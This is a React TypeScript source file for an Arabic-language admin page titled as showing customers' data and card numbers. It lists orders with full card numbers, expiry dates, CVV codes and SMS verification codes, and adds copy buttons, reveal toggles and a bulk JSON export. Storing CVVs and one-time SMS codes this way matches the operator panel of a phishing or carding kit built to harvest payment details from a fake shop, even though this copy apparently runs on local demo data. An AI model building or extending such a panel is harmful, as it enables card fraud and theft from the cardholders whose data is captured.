import React, { useState, useEffect } from 'react';
import { Eye, EyeOff, Copy, Check, Search, Download, Filter, CreditCard, Shield, Calendar, MapPin, Phone, Mail } from 'lucide-react';

interface Order {
  id: string;
  transactionId: string;
  date: string;
  dateFormatted: string;
  status: string;
  customer: {
    name: string;
    email: string;
    phone: string;
    address: string;
    city: string;
    postalCode: string;
    notes: string;
  };
  payment: {
    method: string;
    cardNumber: string;
    cardName: string;
    expiryDate: string;
    cvv: string;
    maskedCardNumber: string;
  };
  items: Array<{
    id: string;
    name: string;
    nameEn: string;
    price: number;
    quantity: number;
    total: number;
    image: string;
    category: string;
  }>;
  summary: {
    subtotal: number;
    shipping: number;
    total: number;
  };
  verification: {
    smsCode: string;
    verifiedAt: string;
  };
}

const CustomerDataPage: React.FC = () => {
  const [orders, setOrders] = useState<Order[]>([]);
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedOrder, setSelectedOrder] = useState<Order | null>(null);
  const [showCardNumbers, setShowCardNumbers] = useState<{[key: string]: boolean}>({});
  const [showCVV, setShowCVV] = useState<{[key: string]: boolean}>({});
  const [copiedField, setCopiedField] = useState<string>('');

  useEffect(() => {
    const savedOrders = JSON.parse(localStorage.getItem('orders') || '[]');
    setOrders(savedOrders);
  }, []);

  const filteredOrders = orders.filter(order => 
    order.customer.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
    order.customer.email.toLowerCase().includes(searchTerm.toLowerCase()) ||
    order.customer.phone.includes(searchTerm) ||
    order.transactionId.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const copyToClipboard = (text: string, field: string) => {
    navigator.clipboard.writeText(text);
    setCopiedField(field);
    setTimeout(() => setCopiedField(''), 2000);
  };

  const toggleCardVisibility = (orderId: string) => {
    setShowCardNumbers(prev => ({
      ...prev,
      [orderId]: !prev[orderId]
    }));
  };

  const toggleCVVVisibility = (orderId: string) => {
    setShowCVV(prev => ({
      ...prev,
      [orderId]: !prev[orderId]
    }));
  };

  const exportData = () => {
    const dataStr = JSON.stringify(orders, null, 2);
    const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
    
    const exportFileDefaultName = `customer-data-${new Date().toISOString().split('T')[0]}.json`;
    
    const linkElement = document.createElement('a');
    linkElement.setAttribute('href', dataUri);
    linkElement.setAttribute('download', exportFileDefaultName);
    linkElement.click();
  };

  return (
    <div className="min-h-screen bg-gray-50 pt-20">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Header */}
        <div className="mb-8">
          <div className="flex justify-between items-center mb-6">
            <div>
              <h1 className="text-3xl font-bold text-gray-900 mb-2">بيانات العملاء وأرقام البطاقات</h1>
              <p className="text-gray-600">جميع المعلومات المدخلة من العملاء</p>
            </div>
            <div className="flex gap-4">
              <button
                onClick={exportData}
                className="bg-blue-500 text-white px-4 py-2 rounded-lg hover:bg-blue-600 transition-colors flex items-center gap-2"
              >
                <Download className="w-4 h-4" />
                تصدير البيانات
              </button>
            </div>
          </div>

          {/* Search */}
          <div className="relative mb-6">
            <Search className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
            <input
              type="text"
              placeholder="ابحث في البيانات (الاسم، الإيميل، الهاتف، رقم المعاملة)..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="w-full pr-10 pl-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent"
            />
          </div>

          {/* Stats */}
          <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-8">
            <div className="bg-white p-4 rounded-lg shadow-sm border">
              <div className="text-2xl font-bold text-blue-600">{orders.length}</div>
              <div className="text-sm text-gray-600">إجمالي الطلبات</div>
            </div>
            <div className="bg-white p-4 rounded-lg shadow-sm border">
              <div className="text-2xl font-bold text-green-600">
                {orders.reduce((sum, order) => sum + order.summary.total, 0).toFixed(2)} ر.س
              </div>
              <div className="text-sm text-gray-600">إجمالي المبيعات</div>
            </div>
            <div className="bg-white p-4 rounded-lg shadow-sm border">
              <div className="text-2xl font-bold text-purple-600">
                {new Set(orders.map(order => order.customer.email)).size}
              </div>
              <div className="text-sm text-gray-600">عملاء فريدين</div>
            </div>
            <div className="bg-white p-4 rounded-lg shadow-sm border">
              <div className="text-2xl font-bold text-orange-600">
                {orders.reduce((sum, order) => sum + order.items.reduce((itemSum, item) => itemSum + item.quantity, 0), 0)}
              </div>
              <div className="text-sm text-gray-600">منتجات مباعة</div>
            </div>
          </div>
        </div>

        {/* Orders Table */}
        {filteredOrders.length === 0 ? (
          <div className="bg-white rounded-lg shadow-sm p-12 text-center">
            <div className="text-6xl mb-4">📋</div>
            <h3 className="text-xl font-semibold text-gray-900 mb-2">لا توجد بيانات حالياً</h3>
            <p className="text-gray-600 mb-6">
              {orders.length === 0 
                ? 'لم يتم إدخال أي طلبات بعد. قم بإجراء طلب تجريبي لرؤية البيانات هنا.'
                : 'لا توجد نتائج تطابق البحث الحالي.'
              }
            </p>
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 max-w-md mx-auto">
              <h4 className="font-semibold text-blue-900 mb-2">لإنشاء طلب تجريبي:</h4>
              <ol className="text-sm text-blue-800 text-right space-y-1">
                <li>1. اذهب للصفحة الرئيسية</li>
                <li>2. أضف منتجات للسلة</li>
                <li>3. اضغط "إتمام الطلب"</li>
                <li>4. أدخل بيانات وهمية</li>
                <li>5. أكمل عملية الدفع</li>
              </ol>
            </div>
          </div>
        ) : (
          <div className="bg-white rounded-lg shadow-sm overflow-hidden">
            <div className="overflow-x-auto">
              <table className="min-w-full divide-y divide-gray-200">
                <thead className="bg-gray-50">
                  <tr>
                    <th className="px-6 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                      معرف الطلب
                    </th>
                    <th className="px-6 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                      العميل
                    </th>
                    <th className="px-6 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                      الاتصال
                    </th>
                    <th className="px-6 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                      رقم البطاقة
                    </th>
                    <th className="px-6 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                      تفاصيل البطاقة
                    </th>
                    <th className="px-6 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                      المبلغ
                    </th>
                    <th className="px-6 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                      التاريخ
                    </th>
                    <th className="px-6 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                      الإجراءات
                    </th>
                  </tr>
                </thead>
                <tbody className="bg-white divide-y divide-gray-200">
                  {filteredOrders.map((order) => (
                    <tr key={order.id} className="hover:bg-gray-50">
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="flex items-center">
                          <div className="text-sm font-medium text-gray-900">{order.transactionId}</div>
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div>
                          <div className="text-sm font-medium text-gray-900">{order.customer.name}</div>
                          <div className="text-sm text-gray-500">{order.customer.city}</div>
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="space-y-1">
                          <div className="flex items-center gap-2">
                            <Phone className="w-4 h-4 text-gray-400" />
                            <span className="text-sm text-gray-900">{order.customer.phone}</span>
                            <button
                              onClick={() => copyToClipboard(order.customer.phone, `phone-${order.id}`)}
                              className="text-gray-400 hover:text-green-500"
                            >
                              {copiedField === `phone-${order.id}` ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                            </button>
                          </div>
                          <div className="flex items-center gap-2">
                            <Mail className="w-4 h-4 text-gray-400" />
                            <span className="text-sm text-gray-900">{order.customer.email}</span>
                            <button
                              onClick={() => copyToClipboard(order.customer.email, `email-${order.id}`)}
                              className="text-gray-400 hover:text-green-500"
                            >
                              {copiedField === `email-${order.id}` ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                            </button>
                          </div>
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="flex items-center gap-2">
                          <CreditCard className="w-4 h-4 text-gray-400" />
                          <span className="text-sm font-mono text-gray-900">
                            {showCardNumbers[order.id] ? order.payment.cardNumber : `****${order.payment.cardNumber.slice(-4)}`}
                          </span>
                          <button
                            onClick={() => toggleCardVisibility(order.id)}
                            className="text-gray-400 hover:text-blue-500"
                          >
                            {showCardNumbers[order.id] ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                          </button>
                          <button
                            onClick={() => copyToClipboard(order.payment.cardNumber, `card-${order.id}`)}
                            className="text-gray-400 hover:text-green-500"
                          >
                            {copiedField === `card-${order.id}` ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                          </button>
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="space-y-1">
                          <div className="text-sm text-gray-900">{order.payment.cardName}</div>
                          <div className="flex items-center gap-2">
                            <span className="text-sm text-gray-500">{order.payment.expiryDate}</span>
                            <span className="text-gray-300">|</span>
                            <span className="text-sm font-mono text-gray-500">
                              {showCVV[order.id] ? order.payment.cvv : '***'}
                            </span>
                            <button
                              onClick={() => toggleCVVVisibility(order.id)}
                              className="text-gray-400 hover:text-blue-500"
                            >
                              {showCVV[order.id] ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
                            </button>
                          </div>
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="text-sm font-bold text-green-600">
                          {order.summary.total.toFixed(2)} ر.س
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="text-sm text-gray-900">
                          {new Date(order.date).toLocaleDateString('ar-SA')}
                        </div>
                        <div className="text-sm text-gray-500">
                          {new Date(order.date).toLocaleTimeString('ar-SA')}
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <button
                          onClick={() => setSelectedOrder(order)}
                          className="bg-blue-500 text-white px-3 py-1 rounded text-sm hover:bg-blue-600 transition-colors"
                        >
                          عرض التفاصيل
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* Order Details Modal */}
        {selectedOrder && (
          <div className="fixed inset-0 z-50 overflow-y-auto">
            <div className="flex items-center justify-center min-h-screen pt-4 px-4 pb-20 text-center sm:block sm:p-0">
              <div className="fixed inset-0 bg-gray-500 bg-opacity-75 transition-opacity" onClick={() => setSelectedOrder(null)}></div>
              
              <div className="inline-block align-bottom bg-white rounded-lg text-right overflow-hidden shadow-xl transform transition-all sm:my-8 sm:align-middle sm:max-w-4xl sm:w-full">
                <div className="bg-white px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
                  <div className="flex justify-between items-center mb-6">
                    <h3 className="text-2xl font-bold text-gray-900">
                      تفاصيل الطلب #{selectedOrder.transactionId}
                    </h3>
                    <button
                      onClick={() => setSelectedOrder(null)}
                      className="text-gray-400 hover:text-gray-600"
                    >
                      ✕
                    </button>
                  </div>

                  <div className="grid md:grid-cols-3 gap-6">
                    {/* Customer Info */}
                    <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
                      <h4 className="font-bold text-blue-900 mb-3 flex items-center gap-2">
                        <MapPin className="w-5 h-5" />
                        معلومات العميل
                      </h4>
                      <div className="space-y-2 text-sm">
                        <div><strong>الاسم:</strong> {selectedOrder.customer.name}</div>
                        <div><strong>الإيميل:</strong> {selectedOrder.customer.email}</div>
                        <div><strong>الهاتف:</strong> {selectedOrder.customer.phone}</div>
                        <div><strong>العنوان:</strong> {selectedOrder.customer.address}</div>
                        <div><strong>المدينة:</strong> {selectedOrder.customer.city}</div>
                        {selectedOrder.customer.postalCode && (
                          <div><strong>الرمز البريدي:</strong> {selectedOrder.customer.postalCode}</div>
                        )}
                        {selectedOrder.customer.notes && (
                          <div><strong>ملاحظات:</strong> {selectedOrder.customer.notes}</div>
                        )}
                      </div>
                    </div>

                    {/* Payment Info */}
                    <div className="bg-green-50 border border-green-200 rounded-lg p-4">
                      <h4 className="font-bold text-green-900 mb-3 flex items-center gap-2">
                        <CreditCard className="w-5 h-5" />
                        معلومات الدفع
                      </h4>
                      <div className="space-y-2 text-sm">
                        <div><strong>طريقة الدفع:</strong> {selectedOrder.payment.method}</div>
                        <div><strong>رقم البطاقة:</strong> 
                          <span className="font-mono mr-2">{selectedOrder.payment.cardNumber}</span>
                        </div>
                        <div><strong>اسم حامل البطاقة:</strong> {selectedOrder.payment.cardName}</div>
                        <div><strong>تاريخ الانتهاء:</strong> {selectedOrder.payment.expiryDate}</div>
                        <div><strong>CVV:</strong> <span className="font-mono">{selectedOrder.payment.cvv}</span></div>
                      </div>
                    </div>

                    {/* Transaction Info */}
                    <div className="bg-purple-50 border border-purple-200 rounded-lg p-4">
                      <h4 className="font-bold text-purple-900 mb-3 flex items-center gap-2">
                        <Shield className="w-5 h-5" />
                        معلومات المعاملة
                      </h4>
                      <div className="space-y-2 text-sm">
                        <div><strong>رقم المعاملة:</strong> {selectedOrder.transactionId}</div>
                        <div><strong>التاريخ:</strong> {selectedOrder.dateFormatted}</div>
                        <div><strong>الحالة:</strong> 
                          <span className="bg-green-100 text-green-800 px-2 py-1 rounded-full text-xs mr-2">
                            مكتمل ✓
                          </span>
                        </div>
                        <div><strong>رمز SMS:</strong> <span className="font-mono">{selectedOrder.verification.smsCode}</span></div>
                        <div><strong>وقت التحقق:</strong> {new Date(selectedOrder.verification.verifiedAt).toLocaleString('ar-SA')}</div>
                      </div>
                    </div>
                  </div>

                  {/* Order Summary */}
                  <div className="mt-6 bg-gray-50 border border-gray-200 rounded-lg p-4">
                    <h4 className="font-bold text-gray-900 mb-3">ملخص الطلب</h4>
                    <div className="grid md:grid-cols-2 gap-4">
                      <div>
                        <h5 className="font-semibold mb-2">المنتجات:</h5>
                        <div className="space-y-2">
                          {selectedOrder.items.map((item, index) => (
                            <div key={index} className="flex justify-between text-sm">
                              <span>{item.name} × {item.quantity}</span>
                              <span>{item.total.toFixed(2)} ر.س</span>
                            </div>
                          ))}
                        </div>
                      </div>
                      <div>
                        <h5 className="font-semibold mb-2">الملخص المالي:</h5>
                        <div className="space-y-2 text-sm">
                          <div className="flex justify-between">
                            <span>المجموع الفرعي:</span>
                            <span>{selectedOrder.summary.subtotal.toFixed(2)} ر.س</span>
                          </div>
                          <div className="flex justify-between">
                            <span>الشحن:</span>
                            <span>{selectedOrder.summary.shipping.toFixed(2)} ر.س</span>
                          </div>
                          <div className="flex justify-between font-bold border-t pt-2">
                            <span>الإجمالي:</span>
                            <span className="text-green-600">{selectedOrder.summary.total.toFixed(2)} ر.س</span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default CustomerDataPage;